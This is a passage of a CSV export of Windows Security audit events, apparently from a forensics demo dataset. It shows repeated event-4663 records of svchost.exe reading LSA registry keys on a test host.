44,452854,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
45,452855,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
46,452856,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
47,452857,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
48,452858,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
49,452859,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
50,452860,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
51,452861,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
52,452862,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
53,452863,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
54,452864,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
55,452865,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
56,452866,2019-03-19 23:35:15.3154053,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
57,452867,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
58,452868,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
59,452869,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
60,452870,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
61,452871,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
62,452872,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
63,452873,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
64,452874,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
65,452875,2019-03-19 23:35:15.3254197,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT 